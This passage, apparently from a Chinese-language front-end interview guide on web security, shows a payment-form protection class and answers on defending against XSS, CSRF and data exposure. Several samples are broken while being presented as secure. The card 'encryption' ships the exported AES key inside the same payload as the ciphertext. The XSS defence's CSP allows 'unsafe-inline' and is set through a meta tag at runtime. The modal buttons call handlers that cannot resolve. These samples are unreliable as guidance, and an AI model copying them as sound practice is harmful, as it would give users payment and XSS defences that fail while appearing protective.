    const exportedKey = await window.crypto.subtle.exportKey('raw', key);
    
    // 组合结果
    const result = {
      key: Array.from(new Uint8Array(exportedKey)),
      iv: Array.from(iv),
      data: Array.from(new Uint8Array(encrypted))
    };
    
    return btoa(JSON.stringify(result));
  }
  
  setupRealTimeValidation(form) {
    // 信用卡号验证
    const cardNumberField = form.querySelector('input[name="card_number"]');
    if (cardNumberField) {
      cardNumberField.addEventListener('input', (e) => {
        this.validateCreditCard(e.target);
      });
    }
    
    // CVV验证
    const cvvField = form.querySelector('input[name="cvv"]');
    if (cvvField) {
      cvvField.addEventListener('input', (e) => {
        this.validateCVV(e.target);
      });
    }
    
    // 过期日期验证
    const expiryField = form.querySelector('input[name="expiry"]');
    if (expiryField) {
      expiryField.addEventListener('input', (e) => {
        this.validateExpiry(e.target);
      });
    }
  }
  
  validateCreditCard(field) {
    const value = field.value.replace(/\s/g, '');
    
    // Luhn算法验证
    const isValid = this.luhnCheck(value);
    
    // 卡片类型检测
    const cardType = this.detectCardType(value);
    
    // 更新UI
    field.classList.toggle('valid', isValid);
    field.classList.toggle('invalid', !isValid && value.length > 0);
    
    // 显示卡片类型
    const cardTypeIndicator = field.parentNode.querySelector('.card-type');
    if (cardTypeIndicator) {
      cardTypeIndicator.textContent = cardType;
      cardTypeIndicator.className = `card-type ${cardType.toLowerCase()}`;
    }
    
    return isValid;
  }
  
  luhnCheck(cardNumber) {
    if (!/^\d+$/.test(cardNumber)) return false;
    
    let sum = 0;
    let alternate = false;
    
    for (let i = cardNumber.length - 1; i >= 0; i--) {
      let digit = parseInt(cardNumber.charAt(i), 10);
      
      if (alternate) {
        digit *= 2;
        if (digit > 9) {
          digit = (digit % 10) + 1;
        }
      }
      
      sum += digit;
      alternate = !alternate;
    }
    
    return sum % 10 === 0;
  }
  
  detectCardType(cardNumber) {
    const patterns = {
      visa: /^4/,
      mastercard: /^5[1-5]/,
      amex: /^3[47]/,
      discover: /^6(?:011|5)/,
      jcb: /^(?:2131|1800|35\d{3})/
    };
    
    for (const [type, pattern] of Object.entries(patterns)) {
      if (pattern.test(cardNumber)) {
        return type.toUpperCase();
      }
    }
    
    return 'UNKNOWN';
  }
  
  validateCVV(field) {
    const value = field.value;
    const isValid = /^\d{3,4}$/.test(value);
    
    field.classList.toggle('valid', isValid);
    field.classList.toggle('invalid', !isValid && value.length > 0);
    
    return isValid;
  }
  
  validateExpiry(field) {
    const value = field.value;
    const match = value.match(/^(\d{2})\/(\d{2})$/);
    
    if (!match) {
      field.classList.add('invalid');
      return false;
    }
    
    const month = parseInt(match[1], 10);
    const year = parseInt('20' + match[2], 10);
    const now = new Date();
    const expiry = new Date(year, month - 1);
    
    const isValid = month >= 1 && month <= 12 && expiry > now;
    
    field.classList.toggle('valid', isValid);
    field.classList.toggle('invalid', !isValid);
    
    return isValid;
  }
  
  preventDoubleSubmission(form) {
    let isSubmitting = false;
    
    form.addEventListener('submit', (e) => {
      if (isSubmitting) {
        e.preventDefault();
        return false;
      }
      
      isSubmitting = true;
      
      // 禁用提交按钮
      const submitButton = form.querySelector('button[type="submit"]');
      if (submitButton) {
        submitButton.disabled = true;
        submitButton.textContent = '处理中...';
      }
      
      // 5秒后重新启用（防止网络问题导致永久禁用）
      setTimeout(() => {
        isSubmitting = false;
        if (submitButton) {
          submitButton.disabled = false;
          submitButton.textContent = '确认支付';
        }
      }, 5000);
    });
  }
  
  monitorPaymentBehavior(form) {
    let formInteractions = [];
    let suspiciousActivity = 0;
    
    // 监控表单填写行为
    const fields = form.querySelectorAll('input');
    
    fields.forEach(field => {
      field.addEventListener('focus', (e) => {
        formInteractions.push({
          type: 'focus',
          field: e.target.name,
          timestamp: Date.now()
        });
      });
      
      field.addEventListener('input', (e) => {
        const interaction = {
          type: 'input',
          field: e.target.name,
          length: e.target.value.length,
          timestamp: Date.now()
        };
        
        formInteractions.push(interaction);
        
        // 检测异常快速输入（可能是自动填充工具）
        if (formInteractions.length >= 2) {
          const lastInteraction = formInteractions[formInteractions.length - 2];
          const timeDiff = interaction.timestamp - lastInteraction.timestamp;
          
          if (timeDiff < 50 && interaction.length > lastInteraction.length + 5) {
            suspiciousActivity++;
          }
        }
      });
      
      field.addEventListener('paste', (e) => {
        formInteractions.push({
          type: 'paste',
          field: e.target.name,
          timestamp: Date.now()
        });
        
        // 粘贴敏感信息可能有风险
        if (['card_number', 'cvv'].includes(e.target.name)) {
          suspiciousActivity++;
        }
      });
    });
    
    // 定期检查可疑活动
    setInterval(() => {
      if (suspiciousActivity > 3) {
        this.handleSuspiciousPaymentActivity(formInteractions);
        suspiciousActivity = 0; // 重置计数
      }
    }, 10000);
  }
  
  handleSuspiciousPaymentActivity(interactions) {
    // 上报可疑支付活动
    fetch('/api/security/suspicious-payment', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        interactions: interactions.slice(-20), // 只发送最近20次交互
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        url: window.location.href
      })
    });
    
    // 可以选择要求额外验证
    this.requestAdditionalVerification();
  }
  
  requestAdditionalVerification() {
    const modal = document.createElement('div');
    modal.className = 'security-verification-modal';
    modal.innerHTML = `
      <div class="modal-overlay">
        <div class="modal-content">
          <h3>安全验证</h3>
          <p>为了您的账户安全，请完成额外验证。</p>
          <div class="verification-methods">
            <button onclick="this.sendSMSCode()">短信验证码</button>
            <button onclick="this.sendEmailCode()">邮箱验证码</button>
          </div>
        </div>
      </div>
    `;
    
    document.body.appendChild(modal);
  }
  
  // 安全的支付数据提交
  async securePaymentSubmit(formData) {
    try {
      // 1. 最终验证
      if (!this.validateAllPaymentFields(formData)) {
        throw new Error('支付信息验证失败');
      }
      
      // 2. 加密敏感数据
      const encryptedData = await this.encryptPaymentData(formData);
      
      // 3. 添加安全头
      const secureHeaders = {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRF-Token': this.csrfProtection.getToken(),
        'X-Payment-Timestamp': Date.now().toString(),
        'X-Payment-Fingerprint': await this.generatePaymentFingerprint()
      };
      
      // 4. 发送请求
      const response = await fetch('/api/payment/process', {
        method: 'POST',
        headers: secureHeaders,
        body: JSON.stringify(encryptedData)
      });
      
      if (!response.ok) {
        throw new Error('支付处理失败');
      }
      
      return await response.json();
      
    } catch (error) {
      // 记录支付错误（不包含敏感信息）
      this.logPaymentError(error.message);
      throw error;
    }
  }
  
  validateAllPaymentFields(formData) {
    const requiredFields = ['card_number', 'expiry', 'cvv', 'cardholder_name'];
    
    for (const field of requiredFields) {
      if (!formData[field] || formData[field].trim() === '') {
        return false;
      }
    }
    
    // 具体字段验证
    return this.luhnCheck(formData.card_number.replace(/\s/g, '')) &&
           /^\d{3,4}$/.test(formData.cvv) &&
           /^\d{2}\/\d{2}$/.test(formData.expiry);
  }
  
  async encryptPaymentData(formData) {
    const sensitiveFields = ['card_number', 'cvv'];
    const encryptedData = { ...formData };
    
    for (const field of sensitiveFields) {
      if (encryptedData[field]) {
        encryptedData[field] = await this.encryptData(encryptedData[field]);
      }
    }
    
    return encryptedData;
  }
  
  async generatePaymentFingerprint() {
    const data = {
      timestamp: Date.now(),
      userAgent: navigator.userAgent,
      screen: `${screen.width}x${screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      language: navigator.language
    };
    
    const encoder = new TextEncoder();
    const encodedData = encoder.encode(JSON.stringify(data));
    const hashBuffer = await crypto.subtle.digest('SHA-256', encodedData);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
  }
  
  logPaymentError(message) {
    fetch('/api/payment/error-log', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        error: message,
        timestamp: new Date().toISOString(),
        url: window.location.href,
        userAgent: navigator.userAgent
      })
    });
  }
}
```

## 常见面试问题

### Q1: 如何防范XSS攻击？

**防护策略：**
1. **输入验证**：严格验证用户输入
2. **输出编码**：对输出内容进行HTML实体编码
3. **CSP策略**：设置内容安全策略
4. **HttpOnly Cookie**：防止脚本访问Cookie

**代码示例：**
```javascript
// 输入验证和输出编码
function secureDisplay(userInput) {
  // 1. 输入验证
  if (typeof userInput !== 'string' || userInput.length > 1000) {
    throw new Error('Invalid input');
  }
  
  // 2. HTML实体编码
  const escaped = userInput
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
  
  // 3. 安全显示
  return escaped;
}

// CSP设置
const csp = "default-src 'self'; script-src 'self' 'unsafe-inline';";
document.querySelector('meta[http-equiv="Content-Security-Policy"]').content = csp;
```

### Q2: CSRF攻击如何防护？

**防护方法：**
1. **CSRF Token**：在表单中添加随机token
2. **SameSite Cookie**：限制跨站请求携带Cookie
3. **Referer检查**：验证请求来源
4. **双重Cookie验证**：结合Cookie和请求头验证

**实现示例：**
```javascript
// CSRF Token生成和验证
class CSRFProtection {
  generateToken() {
    const array = new Uint8Array(32);
    crypto.getRandomValues(array);
    return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
  }
  
  addTokenToForm(form) {
    const token = this.generateToken();
    const input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'csrf_token';
    input.value = token;
    form.appendChild(input);
    
    // 同时设置到Cookie中用于双重验证
    document.cookie = `csrf_token=${token}; SameSite=Strict; Secure`;
  }
}
```

### Q3: 如何保护敏感数据？

**保护措施：**
1. **数据脱敏**：显示时隐藏敏感部分
2. **加密存储**：本地存储时加密
3. **HTTPS传输**：确保传输安全
4. **访问控制**：限制数据访问权限

**实现示例：**
```javascript
// 敏感数据保护
class DataProtection {
  // 信用卡号脱敏
  maskCreditCard(cardNumber) {
    return cardNumber.replace(/(\d{4})\d{8}(\d{4})/, '$1-****-****-$2');
  }
  
  // 客户端加密
  async encryptSensitiveData(data) {
    const key = await crypto.subtle.generateKey(
      { name: 'AES-GCM', length: 256 },
      true,
      ['encrypt', 'decrypt']
    );
    
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encoded = new TextEncoder().encode(data);
    
    const encrypted = await crypto.subtle.encrypt(
      { name: 'AES-GCM', iv },
      key,
      encoded
    );
    
    return {
      encrypted: Array.from(new Uint8Array(encrypted)),
      iv: Array.from(iv),
      key: await crypto.subtle.exportKey('raw', key)
    };
  }
}
```

## 总结

Web安全是一个系统性工程，需要从多个层面进行防护：

### 核心安全原则
1. **最小权限原则**：只给予必要的权限
2. **深度防护**：多层安全措施
3. **安全设计**：从设计阶段考虑安全
4. **持续监控**：实时监控和响应

### 关键防护技术
- **XSS防护**：输入验证、输出编码、CSP
- **CSRF防护**：Token验证、SameSite Cookie
- **数据保护**：加密、脱敏、访问控制
- **会话安全**：安全Cookie、会话管理

### 面试重点
- **安全威胁理解**：各种攻击方式的原理和危害
- **防护措施掌握**：具体的防护技术和实现方法
- **安全编码实践**：编写安全的前端代码
- **安全工具使用**：CSP、HTTPS、安全头等工具的使用

### 最佳实践
- 建立安全开发流程
- 定期进行安全审计
- 保持安全意识和学习
- 及时更新安全补丁 